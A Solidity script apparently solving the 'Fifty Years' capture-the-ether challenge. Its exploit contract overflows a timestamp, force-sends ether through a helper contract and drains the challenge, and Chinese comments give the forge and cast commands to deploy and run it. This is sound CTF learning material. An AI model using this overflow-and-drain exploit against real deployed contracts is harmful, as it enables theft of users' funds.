// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "../src/ForceSend.sol";


interface IFiftyYearsChallenge {

    function isComplete() external view returns (bool); 

    function upsert(uint256 index, uint256 timestamp) external payable; 

    function withdraw(uint256 index) external; 
}

//部署: forge create script/FiftyYears.s.sol:FiftyYearsChallengeHack --rpc-url $RPC --private-key=$PRIVATE_KEY 
//部署: forge create src/FiftyYears.sol:FiftyYearsChallenge --rpc-url $RPC --private-key=$PRIVATE_KEY --value '1 wei' --constructor-args '0x4B194F56Ec1503B4edC6977B5D01Ea7ad779df41'
//调用: cast send 0x4B194F56Ec1503B4edC6977B5D01Ea7ad779df41 "exploit(address)" "0x98C1A3b760D1F27c021c6306588e1640CDFdE665" --rpc-url $RPC --private-key $PRIVATE_KEY --value '5'
//查看: cast call 0x4B194F56Ec1503B4edC6977B5D01Ea7ad779df41 "getStatus(address)(bool)" "0x98C1A3b760D1F27c021c6306588e1640CDFdE665" --rpc-url $RPC
contract FiftyYearsChallengeHack {

    function exploit (address addr) external payable{
        IFiftyYearsChallenge challenge = IFiftyYearsChallenge (addr);

        uint256 dateOverflow = 2**256 - 1 days;
        challenge.upsert{value: 1 wei}(1, dateOverflow);
        challenge.upsert{value: 2 wei}(2, 0);
        
        new ForceSend{value: 2 wei}(address(challenge));
        challenge.withdraw(2);
    }

    function getStatus(address addr) external view returns(bool){
        IFiftyYearsChallenge challenge = IFiftyYearsChallenge (addr);
        return challenge.isComplete();
    }

    receive() external payable {}
} 

